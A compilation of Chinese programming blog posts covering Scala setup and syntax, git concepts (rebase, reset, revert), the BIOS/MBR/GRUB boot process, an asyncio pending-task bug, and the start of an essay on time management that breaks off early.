  使用文本工具开发项目可以很好的理解运行原理，但是不利于开发综合项目，所以在实际开发中我们要使用 Idea 来开发。步骤如下：  1、新建一个 Maven 工程，在工程的 main 目录下新建一个 scala 文件夹，将该文件夹标记为【源码文件夹】，方便管理。右键 scala -> Mark Directory as -> Sources Root  2、默认情况下，不能写 scala 程序，需要我们引入 scala 框架(即将该工程关联上 scala)，选中该项目右键 -> Add Framework Support… -> 勾选左侧 Scala -> 指定 Scala 安装的主目录 -> OK。  3、在 scala 文件夹上右击，选择新建一个 Scala 类，勾选 Kind 为 Object，如下图所示：  
  4、开发一个 HelloScala.scala 程序。  5、运行后，就可以看到输出。  
1.8.4 使用 java 写一段模拟代码，来模拟 scala 的执行流程
代码如下：
package com.atguigu.chapter01.Test;/** * @author chenmingjun * 2019-03-22 18:25 *//** * 可以理解我们在 main 中写的代码放在 HelloScala$ 的 mian 里，即 scala 在底层运行的时候，编译器做了一个包装。 */public class HelloScala {    public static void main(String[] paramArrayOfString) {        HelloScala$.MODULE$.main(paramArrayOfString);    }}final class HelloScala$ {    public static final HelloScala$ MODULE$;    static {        MODULE$ = new HelloScala$();    }    public void main(String[] args) {        System.out.println("hello scala");    }}
1.8.5 Scala 执行流程分析

1.8.6 Scala 程序开发注意事项(重点)
注意事项：  1、Scala 源文件以 “.scala" 为扩展名。  2、Scala 程序的执行入口是 main() 函数。  3、Scala 语言严格区分大小写。  4、Scala 方法由一条条语句构成，每个语句后不需要分号(Scala 语言会在每行后自动加分号)，这也体现出 Scala 的简洁性。  5、如果在同一行有多条语句，除了最后一条语句不需要分号，其它语句需要分号。
1.9 Scala 语言转义字符
\t      ：一个制表位，实现对齐的功能\n      ：换行符\\      ：一个\\"      ：一个"\r      ：一个回车  println("hello\rk"); 
1.10 Scala 语言输出的三种方式
  1、字符串通过+号连接（类似java）。  2、printf 用法（类似C语言）字符串通过 % 传值。  3、字符串通过 $ 引用（类似PHP）。示例代码：
package com.atguigu.chapter01/**  * @author chenmingjun  *         2019-03-22 19:14  */object PrintDemo {  def main(args: Array[String]): Unit = {    val str1: String = "hello"    val str2: String = "world"    // 连接打印    println(str1 + str2)    val name: String = "tom"    val age: Int = 10    val sal: Float = 10.67f    val height: Double = 180.75    // 格式化输出    printf("名字=%s 年龄=%d 薪水=%.2f 身高=%.3f", name, age, sal, height)    // scala 支持使用 $ 输出内容    println(s"个人信息如下1：\n 名字$name\n 年龄$age\n 薪水$sal\n")    // 如果字符串中出现了类似 ${age + 10} ，则表示 {} 是一个表达式    println(s"个人信息如下2：\n 名字${name}\n 年龄${age + 10}\n 薪水${sal}\n")  }}
输出结果：
helloworld名字=tom 年龄=10 薪水=10.67 身高=180.750个人信息如下1：名字tom年龄10薪水10.67个人信息如下2：名字tom年龄20薪水10.67
1.11 Scala 源码的查看的关联
  在使用 scala 过程中，为了搞清楚 scala 底层的机制，需要查看源码，下面看看如果关联和查看 scala 的源码包。1、查看源码, 选择要查看的方法或者类, 输入 Ctrl + B 或者 双击当我们没关联源码时，会看到如下图：
我么可以点击 Download… 自动下载源码，也可以手动关联源码。
2、手动关联源码源码包下载地址：https://www.scala-lang.org/download/2.11.8.html，修改我们下载的源码包 scala-2.11.8.tar.gz 包名为 scala-sources-2.11.8.tar.gz，为了方便识别步骤一：将我们的源码包拷贝至 scala/lib 文件夹下（scala-sources-2.11.8.tar.gz），这样为了方便管理，然后进行解压（因为 IDEA 不识别 xxx.tar.gz 这种格式的压缩包）步骤二：关联即可，点击 Attach Sources…，选中 scala-sources-2.11.8 这个文件夹，进行关联，最后，可以看到源码

1.12 注释
1.12.1 介绍

  用于注解说明解释程序的文字就是注释，注释提高了代码的阅读性。  注释是一个程序员必须要具有的良好编程习惯。将自己的思想通过注释先整理出来，再用代码去体现。


1.12.2 Scala 中的注释类型
  1、单行注释：格式：// 注释文字  2、多行注释：格式： /* 注释文字 */  3、文档注释：注释内容可以被工具 scaladoc 所解析，生成一套以网页文件形式体现的该程序的说明文档。
1.12.3 文档注释案例
  1、打开文件所在的目录，选中文件右键 -> Show in Explorer  2、在命令行窗口中输入 scaladoc -d d:/mydoc Comment.scala 可以生成对应的文档说明。示例代码如下：
package com.atguigu.chapter01/**  * 文档注释案例  * @author chenmingjun  *         2019-03-23 0:22  */object Comment {  def main(args: Array[String]): Unit = {    println("hello world")  }  /**    * @deprecated 过期    * @example    *          输入 n1 = 10 n2 = 20 return 30    * @param n2    * @return 求和    */  def sum(n1: Int, n2: Int): Int = {    return n1 + n2  }}
1.12.4 scala 的代码规范说明
1.12.5 正确的注释和注释风格
  查看 Scala 源码。
1.12.6 正确的缩进和空白
  1、使用一次 tab 操作，实现缩进，默认整体向右边移动，使用 Shift + Tab 整体向左移。  2、或者使用 Ctrl + Alt + L 来进行格式化代码。  3、运算符两边习惯性各加一个空格。比如：2 + 4 * 5。  4、一行最长不超过 80 个字符，超过的请使用换行展示，尽量保持格式优雅。
1.12.7 Scala 官方编程指南
API 下载地址：https://www.scala-lang.org/download/2.11.8.html

1.13 本章知识回顾

Scala 语言的 sdk 是什么？答：Scala 的类库。
Scala 环境变量配置及其作用。配置 SCALA_HOME=D:\learn\Scala\scala-2.11.8配置 Path=%SCALA_HOME%\bin
Scala 程序的编写、编译、运行步骤是什么？能否一步执行?？编写：就是使用工具，开发 scala 程序。编译：就是将 .scala 文件编译成 .class 【命令：scalac]】。运行：就是使用 scala 来将 .class 文件加载到 jvm 并运行，可以直接运行 .scala, 但是速度慢。【命令：scala xxx.scala】。
Scala 程序编写的规则。// 规范基本上和 java 类似。但是语句后面不需要加上分号。
简述：在配置环境、编译、运行各个步骤中常见的错误。



https://www.cnblogs.com/chenmingjun/p/10582571.html
**************************************************
深入理解Git - 一切皆commit
在对 git 有了基本理解和知道常规操作之后，如何对 git 的使用有进一步的理解？
一切皆 commit 或许是个不错的理解思路。
本文将从『一切皆 commit 』的角度，通过 git 中常见的名词，如 commit, branch, tag, HEAD 和动词，如 cherry-pick, rebase, reset, revert, stash 来理解 git。通过这些理解，期望能够更好地处理使用 git 中遇到的问题。
比如：

1 做了两个提交的修改，然后删掉分支了，过会发现刚才两个提交有价值，怎么找回来？

2 基于当前 release 分支开发功能，中途误合并了 dev 分支，
然后又进行了几次提交，怎么取消合并dev的操作？
3 rebase(变基)究竟是什么意思？
等等。


配合希沃白板课件食用，效果更佳：
【希沃白板5】课件分享 : 《Git 进阶 - 从使用角度深入理解Git》
https://r302.cc/ke8XdO?platform=enpc&channel=copylink
点击链接直接预览课件

一切皆 commit
1 commit 的原子性

在 git 中有工作区，暂存区和代码仓库三个概念，那为什么要有暂存区呢？为了保证提交的原子性，在 git 的应用层面上，提交（commit，名词）是 git 主要命令的操作的最小单位了。
关于此，可以查看这篇知乎贴：为什么要先 git add 才能 git commit ？ - Ivony的回答 - 知乎
本文中的内容很少涉及工作区和暂存区的操作，有了 commit 是 git 操作的基本单位这个概念，接下来将从『一切皆 commit』来理解 git。

2 一切皆 commit ：名词部分
2.1 本地仓库

如上图，其实比较好理解，我们知道 commit 有一个 commit id，另外还是 branch（分支），tag（标签），HEAD（当前分支头结点）这些概念。他们都是指向某个提交的引用（或者理解为指针）。

branch（分支）：指向你当前工作分支的最新的那个提交，当在当前分支有了新的提交，则 git 自动更新这个分支指针，以指向最新的提交。

tag（标签）：对某个提交或者分支打 tag 之后，将固定指向那个提交，后续即使分支有更新甚至删除，tag 所指向的提交不变，且一直存在。
HEAD（头结点）：指向当前工作的分支，即 HEAD 是当前分支的一个引用，如果切换了分支，HEAD 随之更新。

如此，便理解了，branch，tag，HEAD 这些，本质上都是指向某个提交的引用，即：一切都是 commit 。


2.2 远端仓库
有一个引用，需要单独说明，就是 origin/branch ，通常称之为远程分支，那这个远程分支指向哪里呢？
如何在 『一切皆commit』 这句咒语下理解远程仓库？
以 master 分支为例，origin/master 指向的，就是当前远端 master 分支最新的那个提交。等等，其实这句话有点小问题，应该是最后一次更新本地仓库时，远端 master 分支最新的那个提交。那什么时候会更新远程仓库？在执行 pull push fetch 时更新。
你或许听说过 git pull = git fetch + git merge 的说法。
当执行 git fetch 命令时，只更新 origin/master 分支（包括所有其它的 origin 远端分支），但并不会影响本地的任何分支。
那要更新本地的 master 分支怎么办？ git merge origin/master ，将远端的分支合并到本地分支，即完成了对本地 master 分支的更新。所以，实际上，git pull = git fetch + git merge 。
(@master)git pull = git fetch & git merge origin/master
案例
你在 f/table 分支开发功能，现在需要合并最新dev，可以怎么做？
刚学 git 时，可能会这么做：
(@f/table) git checkout dev
(@dev) git pull 
(@dev) git checkout f/table
(@f/table) git merge dev
实际上，不需要切到 dev 分支，先更新 dev，则合并。以下命令即可：
(@f/table) git fetch
(@f/table) git merge origin/dev
小结：origin/branch 是指向此分支云端最新提交的引用（最新=最后一次更新），在执行 fetch pull push 指令时自动更新。

可以使用 git show 命令查看一个提交的详细信息，
因为 commitId/HEAD/branch/tag/origin-branch 这些都是指向一个提交，所以 show 命令后面写任意一个都可以。
另外，还可以使用其他参数控制显示内容，这里不展开。
git show commitId/HEAD/branch/tag/origin-branch --format=short 

3 一切皆 commit ：动词部分
3.1 cherry-pick
cherry-pick 比较好理解，就是将一个指定提交的修改摘取过来，举例：

如图，6 提交是增加一个有用的 helper 类（间接说明，一个 commit 最好功能独立），但你不想将整个分支合并过来，就可以使用 cherry-pick 命令。使用任何一个指向 6 提交的引用都可以。
需要说明的是，cherry-pick 过来的提交，只是内容与之前的提交一样，他们是两个不同的提交。
案例
做了两个提交的修改，然后删掉分支了，过会发现刚才两个提交有价值，怎么找回来？
Step1 使用 git reflog 查看之前的提交历史，找到需要找回的提交ID。

Step2 使用 cherry-pick 命令将需要的提交摘取出来即可。
如何丢失的提交比较多，除了可以批量 cherry-pick 之外，根据实际情况，可以直接在那些提交的最新提交上，新建一个分支，那些提交在此之前的所有提交，都在新的分支上了。
新建分支(03620f1 指提交号/commit id)：
git branch newbranch 03620f1
git checkout -b newbranch 03620f1
3.2 rebase
如果用一句话理解 rebase 的话，就是：rebase = 一连串自动的 cherry-pick 。
关于 rebase ，需要回答三个问题：

为什么推荐使用 rebase 而不是 merge？
为什么听说过使用 rebase 会被打？
使用 rebase 有什么问题(什么情况不用 rebase )？

rebase 究竟是什么意思？

如上图，假设 dev 上的提交是 1-2-3-4-5，f/table 分支上的提交是 1-2-3-6-7。现在我们需要合并 dev，通常，会使用 (@f/table)git merge dev 的方式合并。这里，我们使用 rebase 来合并 dev 。
首先，rebase 会找到 dev 和 f/table 共同的父提交，即 3 提交。然后以 dev 最新的提交为基础，把 f/table 分支上新的提交（这里就是 6 和 7），逐个 cherry-pick 过来。形成新的 f/table 分支。
注意，整个过程中，对 dev 分支不会有任何影响，因为你是在 f/table 上进行的操作。所有，rebase 的中文翻译，变基，就可以理解为：变基：用 cherry-pick 的方式，给 f/table 上的新提交，换一个基，将基从之前的 3 换到了 dev 所指的提交 5 上。
问题1 为什么推荐使用 rebase 而不是 merge？

当使用 merge 时，提交历史如右侧所示，使用 rebase 的提交历史如下侧所示。
提交历史更清晰，当分支非常多时，回溯提交与查找问题更容易。
问题2 为什么听说过使用 rebase 会被打
使用 rebase 会修改提交历史，上面的例子中，6和7提交将不在 f/table 分支上存在，取而代之的是8和9分支，在协作分支上，如果6和7已经存在于远端仓库（即别人可能已经基于此有了新的修改），再将6和7移除，将带来诸多冲突与合并的麻烦。（这是，你 push 时，也需要强推，在协作分支上强推，是很危险的行为。）
所以：rebase只对本地未推送的commit上或自己的分支上进行。

问题3 使用 rebase 有什么问题(什么情况不用 rebase )
使用 rebase 的收益：更简洁清晰易回溯的提交历史。
使用 rebase 的代价：逐个 cherry-pick ，如果有冲突，需要逐个解冲突，使合并变复杂。
以合并 dev 分支为例，当工作分支已经做了大量修改（有很多提交，预期有许多冲突），或者之前 merge 过 dev。则建议使用 merge 的方式合并 dev。
rebase 小结：
rebase : 一连串的 cherry-pick。（移花接木）
3.3 reset
reset，重置，将当前分支的状态（这里指工作区，暂存区，代码仓库）重置到指定的状态。reset 的语法如下图，第一个参数是重置方式，后面是一个指向提交的引用（可以是提交ID，分支，tag，HEAD~1等等）。
与 rebase 一样，reset 只对当前分支和工作区，暂存区的数据有影响，对参数中指定的引用没有影响。即 (@f/table)git reset --hard dev 这句命令，影响的是 f/table 分支，对 dev 没有任何影响。

具体来看：
git reset --hard
从参数名可以猜到，这个重置方式比较“强硬”，实际上就是，将当前分支，重置到与指定引用一样的状态，丢弃在这之后的提交，以及工作区和暂存区的提交。

未追踪的文件是不受影响的，PS：git clean 命令会清除掉未追踪的文件。
案例1
(@f/table)git reset --hard f/table~2 的含义？
当前在 f/table 分支，将其重置到 f/table~2 ，结果就是：丢弃掉 f/table 最新的两个提交。
案例2
将当前分支重置到远端最新 dev 的状态，怎么做？
(@f/table)git fetch
(@f/table)git reset --hard origin/dev
注意，这里需要先 fetch 一下远程仓库，更新 origin/dev 分支。
git reset --soft / --mixed
理解了 --hard 的含义，--soft 和 --mixed 就很好理解了，这两个参数，不会丢弃任何内容。
--soft 会将指定提交之后的提交内容，都放到 暂存区，同理，--mixed 会将指定提交之后的提交内容，以及暂存区中的内容，放到工作区。
所以，git reset --mixed HEAD (可以简写为 git reset)，实现的效果就是：将暂存区中的内容，回退到工作区。
git reset --hard HEAD (可以简写为 git reset --hard)，实现的效果就是：将工作区和暂存区中的全部内容。
案例1 将图中的 2 3 4合并为一个提交

案例2 移除误合并

3.4 revert
reset 用于修改错误，通常会修改提交历史，
这在团队协作分支上是危险且不允许的（如很多仓库的 master 分支）。
这时可以使用 revert 命令。
revert 很好理解，就是新建一个提交，用于撤销之前的修改。

有个问题，revert 一个 merge 提交会怎么样？

如图，如果执行 (@f/table)git revert 6
会得到类似这样的提示：

这时，使用 -m 参数可以指定保留那边的提交，可选内容只有 1 和 2 （对于通常的两两合并的情况而言），
1 指代当前分支的那些提交，如果不是很确定，可以使用 git show 命令查看那个合并提交，在前的那个父节点为 1 。


留两个思考题：
1 如何在一切皆 commit 的语境下理解 git commit --amend
2 如何在一切皆 commit 的语境下理解 git stash
后篇：
深入理解Git - Git底层对象

https://www.cnblogs.com/jasongrass/p/10582449.html
**************************************************
计算机启动过程
介绍
操作系统老师说，平时面试学生或者毕业答辩的时候他都会问这个问题，可见这个问题对于计算机专业的学生来说是如此重要。那么，从打开计算机电源到计算机的屏幕显示，中间经历了哪些过程呢？
启动的英文是boot，来自于一个谚语
pull oneself up by one's bootstraps

通过拉自己的鞋带把自己拽起
这个很明显是矛盾的。工程师早期用这句谚语用来比喻早期的计算机开机，
因为计算机启动需要运行程序，而运行程序又需要计算机启动。这个是一个很矛盾的过程。直到后来开机程序被刷入ROM芯片后，这个开机的boot
大概过程是这样的:

Turn on
CPU jump to physical address of BIOS(In Intel it is 0xFFFF0)
BIOS runs POST(Power-On Self Test)
Find bootable devices
Loads boot sector from MBR
BIOS yields control to OS BootLoader

1. BIOS
BIOS介绍:
BIOS（Basic Input/Output System）是基本输入输出系统的简称。BIOS 能为电脑提供最低级、最直接的硬件控制与支持，是联系最底层的硬件系统和软件系统的桥梁。为了在关机后使 BIOS 不会丢失，早期的 BIOS 存储在 ROM 中，并且其大小不会超过 64KB；而目前的 BIOS 大多有 1MB 到 2MB，所以会被存储在 闪存（Flash Memory）中。
BIOS 设置程序是被固化到电脑主板上地 ROM 芯片中的一组程序，其主要功能是为电脑提供最底层的、最直接的硬件设置和控制。 BIOS 通常与
硬件系统集成在一起（在计算机主板的 ROM 或EEPROM 中），所以也被称为 固件

如何运行
BIOS存放在一个断电后不会丢失内容的ROM中，这保证了“拽着鞋带拉起自己”的这种情况不会发生。因为系统一上电或重置，处理器要执行第一条指令的地址会被定位到BIOS存储器，初始化开始运行。在X86系统中，CPU加电后跳转至BIOS的固定物理地址0xFFFF0。
打开计算机电源，计算机会首先加载BIOS，包含
CPU相关信息
设备启动顺序信息
硬盘信息
内存信息
时钟信息
PhP特性
...
硬件自检(Power-On Self Test,POST)
如果硬件出现问题，主板会发出不同含义的蜂鸣 ，启动中止。如果没有问题，屏幕就会显示出CPU 、内存、硬盘等信息。BIOS在执行完硬件自检和初始化后，会将自己复制到从 0xA0000 开始的物理内存中并继续执行。
BIOS 代码包含诊断功能，以保证某些重要硬件组件，像是
键盘、磁盘设备、输出输入端口等等，可以正常运作且正
确地初始化。
BIOS产生的问题

开发效率低：大部分BIOS代码使用汇编开发，开发效率不言而喻。汇编开发的另一个缺点是使得代码与设备的耦合程度太高，代码受硬件变化的影响大。
性能差：BIOS基本输入/输出服务需要通过中断来完成，开销大，并且BIOS没有提供异步工作模式，大量的时间消耗在等待上。
功能扩展性差，升级缓慢：BIOS代码采用静态链接，增加硬件功能时，必须将16位代码放置在0x0C0000～0x0DFFFF区间，初始化时将其设置为约定的中断处理程序。而且BIOS没有提供动态加载设备驱动的方案。
安全性：BIOS运行过程中对可执行代码没有安全方面的考虑。
不支持从硬盘２TB以上的地址引导：受限于BIOS硬盘的寻址方式，BIOS硬盘采用32位地址，因而引导扇区的最大逻辑块地址是232(换算成字节地址，即232×512=2TB)

由于这些问题的存在，UEFI横空出世

UEFI中文名为统一可扩展固件界面(英语：Unified Extensible Firmware Interface，缩写UEFI)是一种个人电脑系统规格，用来定义操作系统与系统硬件之间的软件界面，作为BIOS的替代方案。可扩展固件接口负责加电自检（POST），联系操作系统以及提供连接作业系统与硬体的介面。
UEFI与BIOS的几个区别

EFI使用模块化、C语言风格的参数堆栈传递方式以及动态链接形式构建的系统，相对于BIOS而言跟容易实现，容错和纠错特性更强，减少系统研发的时间。
运行于32位或64位模式，面对未来增强的处理器模式下，能突破BIOS 16位代码的寻址能力，达到处理器最大寻址。
UEFI有良好的鼠标操控图形化界面，在开机速度也比BIOS快不少

BIOS过程

UEFI过程

相对来说UEFI比BIOS少了一个硬件检测
即使如此，本章启动过程还是着重于分析利用BIOS启动的过程。
2.读取MBR
MBR-全称是Master Boot Record(主引导记录或主开机记录)，是一个512byte的扇区，位于磁盘的固定位置。之所以叫“主引导记录”，是因为其存在于驱动器开始部分的一个特殊扇区，个扇区包含已安装的操作系统启动记载器和驱动器的逻辑分区信息。BIOS完成POST和初始化之后，会根据CMOS中设定的顺序选择引导的设备，这个设备可以是U盘可以是硬盘。若设置为硬盘，则BIOS就会读取MBR。MBR里面包含了一段引导程序，一个分区表和Magic Number。
MBR的结构




位置
作用




1-445字节
调用操作系统的机器码(Call OS)


447-510字节
分区表(Partition table)


511-512字节
主引导记录签名(只有两个，0x55和0xAA，为Magic Number)，如果不是这两个幻数，就认为这是一个没有被分区的硬盘。



分区表的长度只有64个字节，里面分为四项，每项为16个字节。所以一个硬盘只可以分四个一级分区，又叫做“主分区”。每个主分区的16个字节，结构如下



位置(字节)
作用




1
如果第一个为0x80，表示该主分区是激活分区(active)，控制权将转交给此分区。几个分区中只能有一个是激活分区，其他都是非激活分区(inactive)。


2-4
主分区的第一个扇区物理位置(柱面、磁头、扇区号等)


5
主分区的类型 分区类型符


6-8
主分区最后一个扇区的物理位置


9-12
主分区第一个扇区的逻辑位置


13-16
主分区的扇区总数，决定了主分区的长度



其中第5字节分区类型符，有如下特定符
00H H —— 表示该分区未用 （ 即没有指定 ） ；
06H H —— FAT 16 基本分区；
0 0 BH —— FAT 32 基本分区；
05H H —— 扩展分区；
07H H —— NTFS 分区；
0 0 FH —— （ LBA 模式 ） 扩展分区 (83H H 为 Linux)
分出主分区后，其余的部分可以分成扩展分区，一般是剩下的部分全部分成扩展分区，也可以不全分，剩下的部分就浪费了。扩展分区不能直接使用，必须分成若干逻辑分区。所有的逻辑分区都是扩展分区的一 部分 。
硬盘的容量 ＝ 主分区的容量 ＋ 扩展分区的容量

扩展分区的容量 ＝ 各个逻辑分区的容量之和
3.启动Boot Loader

​ Linux的Boot的过程 
Boot Loader
又叫做 操作系统内核加载器(OS kernel loader)，一个在kernel运行前运行的一段小程序，通过这段程序可以初始化硬件设备，建立内存空间的映射，将系统软硬件环境带到一个合适的状态，便于未来调用操作系统内核。
Linux下引导加载程序常见两种LILO和GNU GRUB



LILO
GRUB




无交互命令界面
有交互命令界面


不支持网络引导
支持


错误配置MBR会让系统无法引导
如果配置文件错误，则默认跳转到GRUB命令行界面



GRUB 磁盘引导的过程如下
- stage1: grub 读取磁盘第一个 512 字节(硬盘的0道0 面1扇区，被称为 MBR (主引导记录)， 也称为bootsect )。 MBR 由一部分 bootloader 的引导代
码、分区表和魔数三部分组成。（ 启动的第二步 ）
- Stage1.5: 识别各种不同的文件系统格式。这使得 grub 识别到文件系统。
- stage2: 加载系统引导菜单 (/boot/grub/ menu.lst或 grub.lst) ) ，加载内核映像 (kernel image) 和 RAM磁盘 initrd （可选）。
运行主引导程序的具体过程
BIOS将硬盘主引导记录读入7C00处，并将控制权交给主引导程序:

检查0x7dfe地址处是否等于0xaa55。不是则去其他介质；如果没有启动的介质，显示“No ROME BASIC”并死机。
成功找到介质，跳转到0X7C00执行MBR的程序
将自己复制到0x0600处且继续执行
主分区表中搜索标志为激活的分区，如果发现没有激活分区或者不止一个激活分区则停止。
将激活分区的第一个扇区读入内存地址0x7c00
再次检查位于地址0x7dfe的内容是否等于0xaa55，若不等则停止并尝试软盘启动
跳转到0x7c00继续执行特定系统的启动程序

补充：MBR和引导扇区的关系


MBR存放的位置是整个硬盘的第一个扇区
Boot Sector是硬盘上每一个分区的第一个扇区

4. 加载kernel
主要有两个步骤:

根据 grub 设定的内核映像所在路径 ,系统读取内存映像 ,并进行解压缩操
作 。
系统将解压后的内核放置在内存之中， 初始化函数并初始化各种设备 ， 完
成 Linux 核心环境的建立 。

以Linux系统为例，先载入/boot目录下面的kernel。
内核加载成功后，第一个运行的程序是/sbin/init。它根据配置文件（Debian系统是/etc/initab）产生init进程。这是Linux启动后的第一个进程，pid进程编号为1，其他进程都是它的后代。
然后，init线程加载系统的各个模块，比如窗口程序和网络程序，直至执行/bin/login程序，跳出登录界面，等待用户输入username和password。
至此，全部启动过程完成。


https://www.cnblogs.com/adamwong/p/10582183.html
**************************************************
关于asyncio知识（四）
一、使用 asyncio 总结
最近在公司的一些项目中开始慢慢使用python 的asyncio, 使用的过程中也是各种踩坑，遇到的问题也不少，其中有一次是内存的问题，自己也整理了遇到的问题以及解决方法详细内容看：https://www.syncd.cn/article/memory_trouble
在前面整理的三篇asyncio文章中，也都是使用asyncio的一些方法，但是在实际项目中使用还是避免不了碰到问题， 在这周的工作中遇到之前碰见过的问题，一个初学asyncio写代码中经常会碰到的问题，我的业务代码在运行一段时间后提示如下错误提示：

Task was destroyed but it is pending!task: <Task pending coro=<HandleMsg.get_msg() done, defined at ex10.py:17> wait_for=<Future cancelled>>

这个错误我在前面几篇关于asyncio的系列文章中也反复说过这个问题，我也认为自己不会在出现这种问题，但是意外的是，我的程序还是出现了这个错误。
我将我的业务代码通过一个demo代码进行模拟复现以及解决这个问题，下面整理的就是这个过程
二、“Task was destroyed but it is pending!”
我通过下面这张图先描述一下demo程序的逻辑：

 
 

import asyncio
from asyncio import Queue
import uuid
from asyncio import Lock
from asyncio import CancelledError
queue = Queue()
class HandleMsg(object):
    def __init__(self, unid, coroutine_queue, handle_manager):
        self.unid = unid
        self.coroutine_queue = coroutine_queue
        self.handle_manager = handle_manager
    async def get_msg(self):
        while True:
            coroutine_msg = await self.coroutine_queue.get()
            msg_type = coroutine_msg.get("msg")
            if msg_type == "start":
                print("recv unid [%s] is start" % self.unid)
            else:
                print("recv unid [%s] is end" % self.unid)
                # 每个当一个unid收到end消息为结束
                await self.handle_manager.del_unid(self.unid)
class HandleManager(object):
    """
    用于unid和queue的关系的处理
    """
    def __init__(self):
        self.loop = asyncio.get_event_loop()
        self.lock = Lock(loop=self.loop)
        self.handle_dict = dict()
    async def unid_bind(self, unid, coroutine_queue):
        async with self.lock:
            self.handle_dict[unid] = coroutine_queue
    async def get_queue(self, unid):
        async with self.lock:
            if unid in self.handle_dict:
                return self.handle_dict[unid]
    async def del_unid(self, unid):
        async with self.lock:
            if unid in self.handle_dict:
                self.handle_dict.pop(unid)
def make_uniqueid():
    """
    生成unid
    """
    uniqueid = str(uuid.uuid1())
    uniqueid = uniqueid.split("-")
    uniqueid.reverse()
    uniqueid = "".join(uniqueid)
    return uniqueid
async def product_msg():
    """
    生产者
    """
    while True:
        unid = make_uniqueid()
        msg_start = {"unid": unid, "msg": "start"}
        await queue.put(msg_start)
        msg_end = {"unid": unid, "msg": "end"}
        await queue.put(msg_end)
        loop = asyncio.get_event_loop()
        await asyncio.sleep(0.2, loop=loop)
async def consumer_from_queue(handle_manager):
    """
    消费者
    """
    while True:
        msg = await queue.get()
        print("consumer recv %s" % msg)
        msg_type = msg.get("msg")
        unid = msg.get("unid")
        if msg_type == "start":
            coroutine_queue = Queue()  # 用于和handle_msg协程进行数据传递
            handle_msg = HandleMsg(unid, coroutine_queue, handle_manager)
            await handle_manager.unid_bind(unid, coroutine_queue)
            await coroutine_queue.put(msg)
            loop = asyncio.get_event_loop()
            # 每次的start消息创建一个task 去处理消息
            loop.create_task(handle_msg.get_msg())
        else:
            coroutine_queue = await handle_manager.get_queue(unid)
            await coroutine_queue.put(msg)
if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    handle_manager = HandleManager()
    #  在最开始创建了两个task 分别是生产者和消费者
    loop.create_task(product_msg())
    loop.create_task(consumer_from_queue(handle_manager))
    loop.run_forever()

上面的代码表面上看没啥问题，我们先看看运行效果：

consumer recv {'unid': '784f436cfaf388f611e94ca974e1ffbe', 'msg': 'start'}
consumer recv {'unid': '784f436cfaf388f611e94ca974e1ffbe', 'msg': 'end'}
Task was destroyed but it is pending!
task: <Task pending coro=<HandleMsg.get_msg() done, defined at demo.py:17> wait_for=<Future cancelled>>
Task was destroyed but it is pending!
task: <Task pending coro=<HandleMsg.get_msg() done, defined at demo.py:17> wait_for=<Future cancelled>>
Task was destroyed but it is pending!
task: <Task pending coro=<HandleMsg.get_msg() done, defined at demo.py:17> wait_for=<Future cancelled>>
Task was destroyed but it is pending!
task: <Task pending coro=<HandleMsg.get_msg() done, defined at demo.py:17> wait_for=<Future cancelled>>
Task was destroyed but it is pending!
task: <Task pending coro=<HandleMsg.get_msg() done, defined at demo.py:17> wait_for=<Future cancelled>>
Task was destroyed but it is pending!
task: <Task pending coro=<HandleMsg.get_msg() done, defined at demo.py:17> wait_for=<Future cancelled>>
..........

程序没运行一段时间都会出现上面显示的错误提示，我先看看错误提示的信息：

 

Task was destroyed but it is pending!
task: <Task pending coro=<HandleMsg.get_msg() done, defined at demo.py:17> wait_for=<Future cancelled>>

 
上面提示的其实就是我的task 是在pendding状态的时候被destroyed了，代码行数以及调用方法都告诉我们了是在：HandleMsg.get_msg() done, defined at demo.py:17
其实问题也比较好找，我们为每个unid创建了一个task来处理消息，但是当我们收到每个unid消息的end消息之后其实这个task任务对于我们来说就已经完成了，同时我们删除了我的unid和queue的绑定，但是我们并没有手动去取消这个task。
 注意：这里我其实也有一个不理解的地方：关于这个task为什么会会destroyed，这个协程里是一个死循环一直在收消息，当queue里面没有消息协程也应该一直在await 地方在等待才对，但是如果我们把收到end消息的那个地方的删除unid和queue的绑定关系不删除，那么这个任务是不会被descroyed。所以没有完全明白这里的机制，如果明白的同学欢迎留言讨论
 
但是即使上面的机制我们有点不是特别明白，我们其实也应该把这个task手动进行cancel的，我们们将上面的代码稍微进行改动如下：

async def get_msg(self):
        try:
            while True:
                coroutine_msg = await self.coroutine_queue.get()
                msg_type = coroutine_msg.get("msg")
                if msg_type == "start":
                    print("recv unid [%s] is start" % self.unid)
                else:
                    print("recv unid [%s] is end" % self.unid)
                    # 每个当一个unid收到end消息为结束
                    await self.handle_manager.del_unid(self.unid)
                    current_task = asyncio.Task.current_task()
                    current_task.cancel()   # 手动cancel 当前的当前的task
        except CancelledError as e:
            print("unid [%s] cancelled success" %self.unid)

这里有个问题需要注意就是当我们对task进行cancel的时候会抛出cancelledError异常，我们需要对异常进行处理。官网也对此进行专门说明：https://docs.python.org/3.6/library/asyncio-task.html#coroutine
内容如下：

cancel()
Request that this task cancel itself.
This arranges for a CancelledError to be thrown into the wrapped coroutine on the next cycle through the event loop. The coroutine then has a chance to clean up or even deny the request using try/except/finally.
Unlike Future.cancel(), this does not guarantee that the task will be cancelled: the exception might be caught and acted upon, delaying cancellation of the task or preventing cancellation completely. The task may also return a value or raise a different exception.
Immediately after this method is called, cancelled() will not return True (unless the task was already cancelled). A task will be marked as cancelled when the wrapped coroutine terminates with a CancelledError exception (even if cancel() was not called).

三、小结
虽然还有一些地方不太明白，但是随着用的越多，碰到的问题越多，一个一个解决，可能现在对某些知识还有点模糊，但是至少比刚开始使用asyncio的时候清晰了好多，之前整理的三篇文章的连接如下：https://www.syncd.cn/article/asyncio_article_01https://www.syncd.cn/article/asyncio_article_02https://www.syncd.cn/article/asyncio_article_03
也欢迎加入交流群一起讨论相关内容：948510543
  
 
https://www.cnblogs.com/zhaof/p/10581972.html
**************************************************
老司机心得之时间管理"入坑"
长期以来，时间管理一直被认为是自我管理，团队管理，项目管理的既关键又基础的手段，就连笔者本人也一直在崇尚时间管理的理念。
但是这里要讲的，不是什么鬼神方法论。而主要是对长时间以来学习和实践时间管理的一些感想。
时间是难以管理的

以一个简单点例子来说明：
我今天定了一个目标，打算花半天时间学习一下 vue.js，做一个基础的 mvc 案例出来。
那么假设我有4个小时进行学习，于是我会列出下面的一个计划详单：

第一个小时，阅读官方文档，有一个大致理念上的了解；
第二个小时，阅读别人的博客案例，了解真实用法是怎么做的；
第三个小时，设计我的案例，完成简单的界面框架，js方法定义；
第四个小时，整合 vue.js，实现逻辑代码并完成调试。

好了，看似近乎完美的一个计划。真实执行起来会是怎么样呢？
第一个小时
